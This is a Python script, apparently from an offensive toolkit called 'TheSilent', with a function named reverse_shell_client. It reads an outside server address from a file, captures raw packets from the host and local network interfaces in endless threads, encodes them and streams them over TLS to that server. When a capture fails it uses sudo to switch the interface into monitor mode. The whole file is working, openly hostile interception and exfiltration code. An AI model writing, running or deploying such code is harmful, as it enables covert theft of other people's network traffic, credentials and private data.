import base64
import binascii
import re
import os
import psutil
import socket
import ssl
import sys
import threading
from sys import platform
from TheSilent.clear import clear

def ip_sniff(server):    
    ip_socket = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(3))
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)

    while True:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0) as sock:
                with context.wrap_socket(sock, server_hostname=server) as secure_sock:
                    secure_sock.connect((server,443))
                    packet = ip_socket.recv(65536)
                    secure_sock.sendall(base64.b64encode(binascii.hexlify(packet).decode().encode()))

        except:
            continue

def lan_sniff(server):
    interface_list = psutil.net_if_addrs()
    for interfaces in interface_list.keys():
        interface = interfaces
    
    lan_socket = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(3))
    lan_socket.bind((interface,0))
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)

    while True:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0) as sock:
                with context.wrap_socket(sock, server_hostname=server) as secure_sock:
                    secure_sock.connect((server,443))
                    packet = lan_socket.recv(65536)
                    secure_sock.sendall(base64.b64encode(binascii.hexlify(packet).decode().encode()))

        except OSError:
            os.system(f"sudo ip link set {interface} down")
            os.system(f"sudo iw {interface} set monitor control")
            os.system(f"sudo ip link set {interface} up")
            continue

        except:
            continue

def reverse_shell_client():
    with open("server.txt", "r") as file:
        server = file.read()
        server = re.sub("[\s\t\r\n]", "", server)

    clear()
    if platform != "linux":
        print("Unsupported platform! Linux is required for this tool!")
        sys.exit()

    ip_thread = threading.Thread(target=ip_sniff, args=[server]).start()
    lan_thread = threading.Thread(target=lan_sniff, args=[server]).start()

reverse_shell_client()
